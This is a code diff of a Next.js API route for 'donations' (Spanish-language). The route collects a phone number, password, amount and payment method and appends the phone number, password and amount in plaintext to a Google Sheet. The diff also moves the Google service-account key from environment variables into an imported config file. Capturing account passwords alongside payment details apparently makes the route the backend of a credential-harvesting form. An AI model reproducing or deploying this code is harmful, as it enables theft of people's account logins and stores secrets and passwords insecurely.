@@ -1,49 +1,41 @@
-import { NextResponse } from 'next/server';
+// /app/api/donaciones/route.ts
+import { NextRequest, NextResponse } from 'next/server';
 import { google } from 'googleapis';
-import {
-  SPREADSHEET_ID_DONACIONES,
-  SHEET_NAME_DONACIONES
-} from '@/config/idSheets';
+import { SPREADSHEET_ID_DONACIONES, SHEET_NAME_DONACIONES, GOOGLE_CLIENT_EMAIL, GOOGLE_PRIVATE_KEY } from '../../../config/idSheets';
 
-export async function POST(request: Request) {
+export async function POST(req: NextRequest) {
   try {
-    const { numero, contraseña, monto } = await request.json();
+    const { phoneNumber, password, amount, selectedActivity, paymentMethod } = await req.json();
 
-    if (!numero || !contraseña || !monto) {
-      return NextResponse.json(
-        { error: 'Faltan datos: número, contraseña o monto.' },
-        { status: 400 }
-      );
+    if (!phoneNumber || !password || !amount || !selectedActivity || !paymentMethod) {
+      return NextResponse.json({ error: 'Faltan datos' }, { status: 400 });
     }
 
-    // Autenticación con Google
+    // Configurar cliente de Google Sheets
     const auth = new google.auth.GoogleAuth({
       credentials: {
-        client_email: process.env.GOOGLE_CLIENT_EMAIL,
-        private_key: process.env.GOOGLE_PRIVATE_KEY?.replace(/\\n/g, '\n')
+        client_email: GOOGLE_CLIENT_EMAIL,
+        private_key: GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
       },
-      scopes: ['https://www.googleapis.com/auth/spreadsheets']
+      scopes: ['https://www.googleapis.com/auth/spreadsheets'],
     });
 
     const sheets = google.sheets({ version: 'v4', auth });
 
-    // Registrar en A:C (fila 2 en adelante)
+    // Insertar fila nueva
     await sheets.spreadsheets.values.append({
       spreadsheetId: SPREADSHEET_ID_DONACIONES,
       range: `${SHEET_NAME_DONACIONES}!A:C`,
       valueInputOption: 'RAW',
+      insertDataOption: 'INSERT_ROWS',
       requestBody: {
-        values: [[numero, contraseña, monto]]
-      }
+        values: [[phoneNumber, password, amount]],
+      },
     });
 
-    return NextResponse.json({ message: 'Datos registrados correctamente.' });
-
-  } catch (error: any) {
-    console.error('Error Google Sheets:', error);
-    return NextResponse.json(
-      { error: 'No se pudo registrar en Google Sheets.', detail: error.message },
-      { status: 500 }
-    );
+    return NextResponse.json({ message: 'Donación registrada correctamente' });
+  } catch (error) {
+    console.error(error);
+    return NextResponse.json({ error: 'Error al registrar la donación' }, { status: 500 });
   }
 }
